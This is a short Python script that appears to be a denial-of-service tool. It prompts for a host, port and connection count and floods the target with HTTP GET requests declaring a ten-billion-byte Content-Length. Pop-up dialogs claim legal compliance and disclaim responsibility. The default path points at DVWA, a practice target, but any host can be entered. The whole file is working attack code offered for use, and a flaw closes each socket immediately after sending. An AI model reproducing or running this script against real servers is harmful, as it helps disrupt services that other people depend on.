import socket
from tkinter import messagebox
import time
print("Please do not use this tool for illegal operations")
messagebox.askquestion('EULA', 'This software complies with Article 286 of the Criminal Law of the Peoples Republic of China, and is not intentionally created or violates national regulations (if you are in another country, please comply with local laws)')
messagebox.askquestion('prompt','The authors of this software do not assume any legal responsibility')
print('Loding...')
CONN = int(input("Number of connections      :"))
HOST = input("IP or Domain Name            :")
PORT = int(input("PORT           :"))
PAGE = "/DVWA"
buf = ("GET %s HTTP/1.1\r\n"
          "Host: %s\r\n"
          "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:52.0 Gecko/20100101 Firefox/52.0\r\n"
          "Content-Length: 10000000000\r\n"
          "\r\n" % (PAGE, HOST))
socks = []
for i in range(CONN):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((HOST, PORT))
         s.send(bytes(buf, encoding='utf-8'))
         print("[+] HTTP:Send Success!,conn=%d" % i)
         socks.append(s)
         s.close()
     except Exception as ex:
         print("[-] HTTP:Send Failure!,ERROR:%s" % ex)
         time.sleep(2)